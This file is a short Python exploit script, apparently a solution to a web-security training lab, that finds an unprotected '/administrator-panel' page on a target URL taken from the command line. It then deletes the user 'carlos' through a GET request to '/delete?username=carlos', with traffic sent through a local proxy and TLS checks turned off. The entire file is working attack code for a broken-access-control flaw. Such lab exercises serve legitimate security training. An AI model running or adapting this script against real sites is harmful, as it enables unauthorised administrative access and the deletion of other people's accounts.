import requests
import sys
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def delete_user(url):
    admin_panel_url = url + '/administrator-panel'
    r = requests.get(admin_panel_url, verify=False, proxies=proxies)
    if r.status_code == 200:
        print('(+) Found the administrator panel!')
        print('(+) Deleting Carlos user...')
        delete_carlos_url = admin_panel_url + '/delete?username=carlos'
        r = requests.get(delete_carlos_url, verify=False, proxies=proxies)
        if r.status_code == 200:
            print('(+) Carlos user delete!')

        else:
            print('(-) Could not delete user.')
    else:
        print('(-) Administrator panel not found.')
        print('(-) Exiting the script...')

def main():
    if len(sys.argv) != 2:
        print("(+) Usage: %s <url>" % sys.argv[0])
        print("(+) Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)

    url = sys.argv[1]
    print("(+) Finding admin panel...")
    delete_user(url)


if __name__ == "__main__":
    main()